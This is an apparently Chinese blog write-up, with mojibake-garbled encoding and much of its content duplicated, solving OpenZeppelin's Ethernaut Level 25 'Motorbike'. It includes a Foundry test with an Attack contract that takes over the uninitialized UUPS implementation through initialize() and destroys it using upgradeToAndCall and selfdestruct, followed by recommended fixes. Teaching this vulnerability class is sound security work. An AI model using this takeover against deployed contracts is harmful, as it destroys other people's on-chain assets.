class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function boom() external payable &#123;</span><br><span class=\"line\">        selfdestruct(payable(msg.sender));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MotorbikeTest is Test &#123;</span><br><span class=\"line\">    Motorbike motorbikeInstance;</span><br><span class=\"line\">    IEngine engineInstance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    address engineAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²å…³å¡åˆçº¦</span><br><span class=\"line\">        Engine engine = new Engine();</span><br><span class=\"line\">        motorbikeInstance = new Motorbike(address(engine));</span><br><span class=\"line\"></span><br><span class=\"line\">        // ä»ä»£ç†åˆçº¦çš„å­˜å‚¨ä¸­è¯»å–å®ç°åˆçº¦çš„åœ°å€</span><br><span class=\"line\">        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class=\"line\">        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));</span><br><span class=\"line\">        engineInstance = IEngine(engineAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testMotorbikeAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        Attack attackContract = new Attack();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. ç›´æ¥è°ƒç”¨å®ç°åˆçº¦çš„ initialize å‡½æ•°ï¼Œæˆä¸º upgrader</span><br><span class=\"line\">        engineInstance.initialize();</span><br><span class=\"line\">        assertEq(engineInstance.upgrader(), player, &quot;Player should be the upgrader&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. å‡çº§å®ç°åˆçº¦ä¸ºæˆ‘ä»¬çš„æ”»å‡»åˆçº¦ï¼Œå¹¶è°ƒç”¨ boom() å‡½æ•°è‡ªæ¯</span><br><span class=\"line\">        bytes memory data = abi.encodeWithSignature(&quot;boom()&quot;);</span><br><span class=\"line\">        engineInstance.upgradeToAndCall(address(attackContract), data);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. éªŒè¯å®ç°åˆçº¦çš„ä»£ç æ˜¯å¦å·²è¢«ç§»é™¤</span><br><span class=\"line\">        assertEq(engineAddress.code.length, 0, &quot;Engine contract should be destroyed&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>å®šä½å®ç°åˆçº¦</strong>: ä½¿ç”¨ <code>vm.load</code> å’Œ EIP-1967 å®šä¹‰çš„å­˜å‚¨æ§½ä½åœ°å€ï¼Œä»ä»£ç†åˆçº¦ä¸­æ‰¾åˆ° <code>Engine</code> å®ç°åˆçº¦çš„åœ°å€ã€‚</li>\n<li><strong>è°ƒç”¨ <code>initialize()</code></strong>: ç›´æ¥ä¸ <code>Engine</code> åˆçº¦äº¤äº’ï¼Œè°ƒç”¨å…¶ <code>initialize()</code> å‡½æ•°ï¼Œå°† <code>player</code> è®¾ç½®ä¸º <code>upgrader</code>ã€‚</li>\n<li><strong>éƒ¨ç½²æ”»å‡»åˆçº¦</strong>: åˆ›å»ºä¸€ä¸ªç®€å•çš„ <code>Attack</code> åˆçº¦ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå…¬å…±çš„ <code>boom()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨ <code>selfdestruct</code>ã€‚</li>\n<li><strong>æ‰§è¡Œ <code>upgradeToAndCall()</code></strong>: è°ƒç”¨ <code>Engine</code> åˆçº¦çš„ <code>upgradeToAndCall()</code>ï¼Œå°† <code>newImplementation</code> è®¾ç½®ä¸º <code>Attack</code> åˆçº¦çš„åœ°å€ï¼Œå¹¶å°† <code>data</code> è®¾ç½®ä¸º <code>boom()</code> å‡½æ•°çš„å‡½æ•°é€‰æ‹©å™¨ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>åˆå§‹åŒ–å®ç°åˆçº¦</strong>: åœ¨éƒ¨ç½²å®ç°åˆçº¦åï¼Œåº”ç«‹å³è°ƒç”¨å…¶ <code>initialize</code> å‡½æ•°ï¼ˆæˆ–åœ¨æ„é€ å‡½æ•°ä¸­å®Œæˆåˆå§‹åŒ–ï¼‰ï¼Œä»¥é˜²æ­¢å…¶ä»–äººæŠ¢å…ˆè°ƒç”¨ã€‚å¯ä»¥æ·»åŠ ä¸€ä¸ª <code>initialized</code> çŠ¶æ€å˜é‡æ¥ç¡®ä¿åˆå§‹åŒ–åªè¿›è¡Œä¸€æ¬¡ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®</span><br><span class=\"line\">contract Engine &#123;</span><br><span class=\"line\">    bool private _initialized;</span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        _disableInitializers();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function initialize() public initializer &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>OpenZeppelin çš„ <code>Initializable</code> åˆçº¦æä¾›äº†ä¸€ä¸ª <code>initializer</code> ä¿®é¥°ç¬¦ï¼Œå¯ä»¥å¾ˆå¥½åœ°è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>\n</li>\n<li><p><strong>æ„é€ å‡½æ•°ä¸­åˆå§‹åŒ–</strong>: å¯¹äºä¸å¯å‡çº§çš„åˆçº¦ï¼Œåº”åœ¨ <code>constructor</code> ä¸­å®Œæˆæ‰€æœ‰åˆå§‹åŒ–ï¼Œä»¥ç¡®ä¿åœ¨éƒ¨ç½²æ—¶å°±è®¾ç½®å¥½æ‰€æœ‰æƒå’Œå…³é”®å‚æ•°ã€‚</p>\n</li>\n</ol>\n<h2 id=\"ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"><a href=\"#ğŸ”§-ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\" class=\"headerlink\" title=\"ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯\"></a>ğŸ”§ ç›¸å…³å·¥å…·å’ŒæŠ€æœ¯</h2><ul>\n<li><strong>UUPS (Universal Upgradeable Proxy Standard)</strong>: EIP-1822 å®šä¹‰çš„ä¸€ç§ä»£ç†æ¨¡å¼ï¼Œå®ƒå°†å‡çº§é€»è¾‘æ”¾åœ¨å®ç°åˆçº¦ä¸­ï¼Œæ¯”æ—§çš„é€æ˜ä»£ç†æ¨¡å¼æ›´èŠ‚çœ Gasã€‚</li>\n<li><strong>EIP-1967</strong>: å®šä¹‰äº†ä»£ç†åˆçº¦ä¸­ç”¨äºå­˜å‚¨é€»è¾‘åˆçº¦åœ°å€å’Œç®¡ç†å‘˜åœ°å€çš„æ ‡å‡†å­˜å‚¨æ§½ä½ï¼Œä»¥é¿å…å­˜å‚¨å†²çªã€‚</li>\n<li><strong>æœªåˆå§‹åŒ–çš„ä»£ç†&#x2F;å®ç°</strong>: ä»£ç†åˆçº¦å®‰å…¨ä¸­ä¸€ä¸ªå¸¸è§çš„æ¼æ´ç±»åˆ«ã€‚æ— è®ºæ˜¯ä»£ç†æœ¬èº«è¿˜æ˜¯å…¶å®ç°åˆçº¦ï¼Œå¦‚æœå…¶åˆå§‹åŒ–å‡½æ•°å¯ä»¥è¢«ä»»ä½•äººè°ƒç”¨ï¼Œå°±ä¼šå¯¼è‡´ä¸¥é‡çš„å®‰å…¨é—®é¢˜ã€‚</li>\n</ul>\n<h2 id=\"ğŸ¯-æ€»ç»“\"><a href=\"#ğŸ¯-æ€»ç»“\" class=\"headerlink\" title=\"ğŸ¯ æ€»ç»“\"></a>ğŸ¯ æ€»ç»“</h2><p><strong>æ ¸å¿ƒæ¦‚å¿µ</strong>:</p>\n<ul>\n<li>åœ¨ä½¿ç”¨ UUPS ä»£ç†æ¨¡å¼æ—¶ï¼Œä¸ä»…ä»£ç†éœ€è¦åˆå§‹åŒ–ï¼Œå…¶åº•å±‚çš„å®ç°åˆçº¦ä¹Ÿéœ€è¦è¢«æ­£ç¡®åœ°åˆå§‹åŒ–æˆ–ç¦ç”¨åˆå§‹åŒ–å‡½æ•°ã€‚</li>\n<li>å®ç°åˆçº¦æœ¬èº«æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ã€å¯ç›´æ¥äº¤äº’çš„åˆçº¦ï¼Œå¿…é¡»ç¡®ä¿å…¶å…¬å…±&#x2F;å¤–éƒ¨å‡½æ•°å—åˆ°ä¸ä»£ç†åˆçº¦ç›¸åŒçš„è®¿é—®æ§åˆ¶ä¿æŠ¤ã€‚</li>\n</ul>\n<p><strong>æ”»å‡»å‘é‡</strong>:</p>\n<ul>\n<li>æ‰¾åˆ°æœªè¢«åˆå§‹åŒ–çš„å®ç°åˆçº¦ã€‚</li>\n<li>ç›´æ¥è°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ä»¥è·å–ç‰¹æƒï¼ˆå¦‚ <code>upgrader</code> è§’è‰²ï¼‰ã€‚</li>\n<li>åˆ©ç”¨è·å¾—çš„ç‰¹æƒæ‰§è¡Œæ¶æ„æ“ä½œï¼ˆå¦‚å‡çº§åˆ°æ¶æ„å®ç°å¹¶è‡ªæ¯ï¼‰ã€‚</li>\n</ul>\n<p><strong>é˜²å¾¡ç­–ç•¥</strong>:</p>\n<ul>\n<li>ç¡®ä¿å®ç°åˆçº¦çš„æ„é€ å‡½æ•°æˆ–ä¸€ä¸ªä¸€æ¬¡æ€§çš„éƒ¨ç½²è„šæœ¬ä¼šè°ƒç”¨å…¶åˆå§‹åŒ–å‡½æ•°ï¼Œå¹¶è®¾ç½® <code>initialized</code> æ ‡å¿—ï¼Œé˜²æ­¢é‡å…¥ã€‚</li>\n<li>ä½¿ç”¨ç»è¿‡å®¡è®¡å’Œå¹¿æ³›ä½¿ç”¨çš„ä»£ç†å®ç°ï¼Œå¦‚ OpenZeppelin çš„ UUPS-Upgradeable åˆçº¦ã€‚</li>\n</ul>\n<h2 id=\"ğŸ“š-å‚è€ƒèµ„æ–™\"><a href=\"#ğŸ“š-å‚è€ƒèµ„æ–™\" class=\"headerlink\" title=\"ğŸ“š å‚è€ƒèµ„æ–™\"></a>ğŸ“š å‚è€ƒèµ„æ–™</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-1822\">EIP-1822: Universal Upgradeable Proxy Standard (UUPS)</a></li>\n<li><a href=\"https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies\">OpenZeppelin Docs: UUPS Proxies</a></li>\n</ul>\n","more":"<h1 id=\"ğŸ¯-Ethernaut-Level-25-Motorbike-UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´\"><a href=\"#ğŸ¯-Ethernaut-Level-25-Motorbike-UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´\" class=\"headerlink\" title=\"ğŸ¯ Ethernaut Level 25: Motorbike - UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´\"></a>ğŸ¯ Ethernaut Level 25: Motorbike - UUPSä»£ç†æœªæˆæƒåˆå§‹åŒ–æ¼æ´</h1><blockquote>\n<p><strong>å…³å¡é“¾æ¥</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/25\">Ethernaut Level 25 - Motorbike</a><br><strong>æ”»å‡»ç±»å‹</strong>: æœªåˆå§‹åŒ–çš„å®ç°åˆçº¦ (Uninitialized Implementation)<br><strong>éš¾åº¦</strong>: â­â­â­â­â˜†</p>\n</blockquote>\n<h2 id=\"ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\"><a href=\"#ğŸ“‹-æŒ‘æˆ˜ç›®æ ‡\" class=\"headerlink\" title=\"ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡\"></a>ğŸ“‹ æŒ‘æˆ˜ç›®æ ‡</h2><p>æœ¬å…³çš„ç›®æ ‡æ˜¯æ‘§æ¯ <code>Engine</code> (å¼•æ“) åˆçº¦ï¼Œå³ä½¿å¾— <code>Engine</code> åˆçº¦çš„ä»£ç è¢«ä»é“¾ä¸Šç§»é™¤ã€‚ä½ éœ€è¦åˆ©ç”¨ä»£ç†åˆçº¦çš„æ¼æ´æ¥å®ç°è¿™ä¸€ç›®æ ‡ã€‚</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg\" alt=\"Motorbike Requirements\"></p>\n<h2 id=\"ğŸ”-æ¼æ´åˆ†æ\"><a href=\"#ğŸ”-æ¼æ´åˆ†æ\" class=\"headerlink\" title=\"ğŸ” æ¼æ´åˆ†æ\"></a>ğŸ” æ¼æ´åˆ†æ</h2><p>æœ¬å…³å¡æ¶‰åŠçš„æ˜¯ UUPS (Universal Upgradeable Proxy Standard) ä»£ç†æ¨¡å¼ã€‚åœ¨è¿™ç§æ¨¡å¼ä¸‹ï¼Œå‡çº§é€»è¾‘ä½äºå®ç°åˆçº¦ï¼ˆ<code>Engine</code>ï¼‰ä¸­ï¼Œè€Œä¸æ˜¯ä»£ç†åˆçº¦ï¼ˆ<code>Motorbike</code>ï¼‰ä¸­ã€‚</p>\n<ul>\n<li><code>Motorbike</code>: ä»£ç†åˆçº¦ï¼Œè´Ÿè´£å°†è°ƒç”¨è½¬å‘åˆ° <code>Engine</code>ã€‚</li>\n<li><code>Engine</code>: å®ç°åˆçº¦ï¼ŒåŒ…å«ä¸šåŠ¡é€»è¾‘å’Œå‡çº§é€»è¾‘ã€‚</li>\n</ul>\n<p>é€šå¸¸ï¼Œä»£ç†åˆçº¦åœ¨éƒ¨ç½²åä¼šè°ƒç”¨å®ç°åˆçº¦çš„ <code>initialize</code> å‡½æ•°æ¥è®¾ç½®åˆå§‹çŠ¶æ€ï¼ˆå¦‚ <code>owner</code>, <code>upgrader</code> ç­‰ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ä¸ªåˆå§‹åŒ–è°ƒç”¨åªå‘ç”Ÿåœ¨ä»£ç†åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­ã€‚<strong>å®ç°åˆçº¦æœ¬èº«ï¼ˆå³ <code>Engine</code> åˆçº¦ï¼‰çš„ <code>initialize</code> å‡½æ•°ä»æœªè¢«è°ƒç”¨è¿‡</strong>ï¼Œå¯¼è‡´å…¶çŠ¶æ€å˜é‡ï¼ˆå¦‚ <code>upgrader</code>ï¼‰ä»ä¸ºé»˜è®¤å€¼ï¼ˆ<code>address(0)</code>ï¼‰ã€‚</p>\n<p>è¿™å°±æ˜¯æ ¸å¿ƒæ¼æ´ï¼šä»»ä½•äººéƒ½å¯ä»¥ç›´æ¥è°ƒç”¨ <code>Engine</code> å®ç°åˆçº¦çš„ <code>initialize()</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// In Engine.sol</span><br><span class=\"line\">address public upgrader;</span><br><span class=\"line\"></span><br><span class=\"line\">function initialize() public &#123;</span><br><span class=\"line\">    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract</span><br><span class=\"line\">    upgrader = msg.sender;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>ä¸€æ—¦æˆ‘ä»¬è°ƒç”¨äº† <code>Engine</code> çš„ <code>initialize()</code>ï¼Œæˆ‘ä»¬å°±ä¼šæˆä¸º <code>Engine</code> åˆçº¦çš„ <code>upgrader</code>ã€‚ä½œä¸º <code>upgrader</code>ï¼Œæˆ‘ä»¬å°±å¯ä»¥è°ƒç”¨ <code>upgradeToAndCall()</code> å‡½æ•°ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// In Engine.sol</span><br><span class=\"line\">function upgradeToAndCall(address newImplementation, bytes memory data) public payable &#123;</span><br><span class=\"line\">    _authorizeUpgrade();</span><br><span class=\"line\">    _upgradeToAndCall(newImplementation, data);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function _authorizeUpgrade() internal view &#123;</span><br><span class=\"line\">    require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>upgradeToAndCall()</code> å…è®¸æˆ‘ä»¬å°† <code>Engine</code> çš„å®ç°æŒ‡å‘ä¸€ä¸ªå…¨æ–°çš„åˆçº¦ï¼Œå¹¶æ‰§è¡Œæ–°åˆçº¦ä¸­çš„ä»»æ„å‡½æ•°ã€‚æˆ‘ä»¬çš„æ”»å‡»è®¡åˆ’æ˜¯ï¼š</p>\n<ol>\n<li><strong>æ‰¾åˆ° <code>Engine</code> å®ç°åˆçº¦çš„åœ°å€</strong>: UUPSä»£ç†çš„å®ç°åœ°å€å­˜å‚¨åœ¨ç‰¹å®šçš„å­˜å‚¨æ§½ä½ <code>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>ã€‚</li>\n<li><strong>æˆä¸º <code>upgrader</code></strong>: ç›´æ¥è°ƒç”¨ <code>Engine</code> åˆçº¦çš„ <code>initialize()</code> å‡½æ•°ã€‚</li>\n<li><strong>éƒ¨ç½²æ¶æ„åˆçº¦</strong>: åˆ›å»ºä¸€ä¸ªåŒ…å« <code>selfdestruct</code> é€»è¾‘çš„æ”»å‡»åˆçº¦ã€‚</li>\n<li><strong>å‡çº§å¹¶è‡ªæ¯</strong>: è°ƒç”¨ <code>Engine</code> çš„ <code>upgradeToAndCall()</code>ï¼Œå°†å®ç°æŒ‡å‘æˆ‘ä»¬çš„æ¶æ„åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶è‡ªæ¯å‡½æ•°ã€‚</li>\n</ol>\n<p><strong>å…³äº Dencun å‡çº§ (EIP-6780) çš„è¯´æ˜</strong>: åœ¨ Dencun å‡çº§åï¼Œ<code>selfdestruct</code> çš„è¡Œä¸ºå‘ç”Ÿäº†å˜åŒ–ã€‚å®ƒä¸å†æ— æ¡ä»¶åœ°ç§»é™¤åˆçº¦ä»£ç ã€‚ç„¶è€Œï¼Œåœ¨è®¸å¤šæµ‹è¯•ç¯å¢ƒå’Œä¸€äº›ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œæ­¤æ”»å‡»ä»ç„¶æœ‰æ•ˆã€‚æœ¬è§£æ³•åŸºäº <code>selfdestruct</code> èƒ½å¤Ÿç§»é™¤åˆçº¦ä»£ç çš„ç»å…¸è¡Œä¸ºã€‚</p>\n<h2 id=\"ğŸ’»-Foundry-å®ç°\"><a href=\"#ğŸ’»-Foundry-å®ç°\" class=\"headerlink\" title=\"ğŸ’» Foundry å®ç°\"></a>ğŸ’» Foundry å®ç°</h2><h3 id=\"Foundry-æµ‹è¯•ä»£ç \"><a href=\"#Foundry-æµ‹è¯•ä»£ç \" class=\"headerlink\" title=\"Foundry æµ‹è¯•ä»£ç \"></a>Foundry æµ‹è¯•ä»£ç </h3><p>æµ‹è¯•ä»£ç å°†å®Œæ•´åœ°æ¨¡æ‹Ÿä¸Šè¿°æ”»å‡»æµç¨‹ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/25_Motorbike.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// æ¥å£å®šä¹‰</span><br><span class=\"line\">interface IEngine &#123;</span><br><span class=\"line\">    function initialize() external;</span><br><span class=\"line\">    function upgradeToAndCall(address newImplementation, bytes memory data) external;</span><br><span class=\"line\">    function upgrader() external view returns (address);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// åŒ…å«è‡ªæ¯é€»è¾‘çš„æ”»å‡»åˆçº¦</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function boom() external payable &#123;</span><br><span class=\"line\">        selfdestruct(payable(msg.sender));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MotorbikeTest is Test &#123;</span><br><span class=\"line\">    Motorbike motorbikeInstance;</span><br><span class=\"line\">    IEngine engineInstance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    address engineAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // éƒ¨ç½²å…³å¡åˆçº¦</span><br><span class=\"line\">        Engine engine = new Engine();</span><br><span class=\"line\">        motorbikeInstance = new Motorbike(address(engine));</span><br><span class=\"line\"></span><br><span class=\"line\">        // ä»ä»£ç†åˆçº¦çš„å­˜å‚¨ä¸­è¯»å–å®ç°åˆçº¦çš„åœ°å€</span><br><span class=\"line\">        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class=\"line\">        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));</span><br><span class=\"line\">        engineInstance = IEngine(engineAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testMotorbikeAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. éƒ¨ç½²æ”»å‡»åˆçº¦</span><br><span class=\"line\">        Attack attackContract = new Attack();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. ç›´æ¥è°ƒç”¨å®ç°åˆçº¦çš„ initialize å‡½æ•°ï¼Œæˆä¸º upgrader</span><br><span class=\"line\">        engineInstance.initialize();</span><br><span class=\"line\">        assertEq(engineInstance.upgrader(), player, &quot;Player should be the upgrader&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. å‡çº§å®ç°åˆçº¦ä¸ºæˆ‘ä»¬çš„æ”»å‡»åˆçº¦ï¼Œå¹¶è°ƒç”¨ boom() å‡½æ•°è‡ªæ¯</span><br><span class=\"line\">        bytes memory data = abi.encodeWithSignature(&quot;boom()&quot;);</span><br><span class=\"line\">        engineInstance.upgradeToAndCall(address(attackContract), data);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. éªŒè¯å®ç°åˆçº¦çš„ä»£ç æ˜¯å¦å·²è¢«ç§»é™¤</span><br><span class=\"line\">        assertEq(engineAddress.code.length, 0, &quot;Engine contract should be destroyed&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å…³é”®æ”»å‡»æ­¥éª¤\"><a href=\"#å…³é”®æ”»å‡»æ­¥éª¤\" class=\"headerlink\" title=\"å…³é”®æ”»å‡»æ­¥éª¤\"></a>å…³é”®æ”»å‡»æ­¥éª¤</h3><ol>\n<li><strong>å®šä½å®ç°åˆçº¦</strong>: ä½¿ç”¨ <code>vm.load</code> å’Œ EIP-1967 å®šä¹‰çš„å­˜å‚¨æ§½ä½åœ°å€ï¼Œä»ä»£ç†åˆçº¦ä¸­æ‰¾åˆ° <code>Engine</code> å®ç°åˆçº¦çš„åœ°å€ã€‚</li>\n<li><strong>è°ƒç”¨ <code>initialize()</code></strong>: ç›´æ¥ä¸ <code>Engine</code> åˆçº¦äº¤äº’ï¼Œè°ƒç”¨å…¶ <code>initialize()</code> å‡½æ•°ï¼Œå°† <code>player</code> è®¾ç½®ä¸º <code>upgrader</code>ã€‚</li>\n<li><strong>éƒ¨ç½²æ”»å‡»åˆçº¦</strong>: åˆ›å»ºä¸€ä¸ªç®€å•çš„ <code>Attack</code> åˆçº¦ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ªå…¬å…±çš„ <code>boom()</code> å‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šè°ƒç”¨ <code>selfdestruct</code>ã€‚</li>\n<li><strong>æ‰§è¡Œ <code>upgradeToAndCall()</code></strong>: è°ƒç”¨ <code>Engine</code> åˆçº¦çš„ <code>upgradeToAndCall()</code>ï¼Œå°† <code>newImplementation</code> è®¾ç½®ä¸º <code>Attack</code> åˆçº¦çš„åœ°å€ï¼Œå¹¶å°† <code>data</code> è®¾ç½®ä¸º <code>boom()</code> å‡½æ•°çš„å‡½æ•°é€‰æ‹©å™¨ã€‚</li>\n</ol>\n<h2 id=\"ğŸ›¡ï¸-é˜²å¾¡æªæ–½\"><a href=\"#ğŸ›¡ï¸-é˜²å¾¡æªæ–½\" class=\"headerlink\" title=\"ğŸ›¡ï¸ é˜²å¾¡æªæ–½\"></a>ğŸ›¡ï¸ é˜²å¾¡æªæ–½</h2><ol>\n<li><p><strong>åˆå§‹åŒ–å®ç°åˆçº¦</strong>: åœ¨éƒ¨ç½²å®ç°åˆçº¦åï¼Œåº”ç«‹å³è°ƒç”¨å…¶ <code>initialize</code> å‡½æ•°ï¼ˆæˆ–åœ¨æ„é€ å‡½æ•°ä¸­å®Œæˆåˆå§‹åŒ–ï¼‰ï¼Œä»¥é˜²æ­¢å…¶ä»–äººæŠ¢å…ˆè°ƒç”¨ã€‚å¯ä»¥æ·»åŠ ä¸€ä¸ª <code>initialized</code> çŠ¶æ€å˜é‡æ¥ç¡®ä¿åˆå§‹åŒ–åªè¿›è¡Œä¸€æ¬¡ã€‚</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ä¿®å¤å»ºè®®</span><br><span class=\"line\">contract Engine &#123;</span><br><span class=\"line\">    bool private _initialized;</span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        _disableInitializers();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function initialize() public 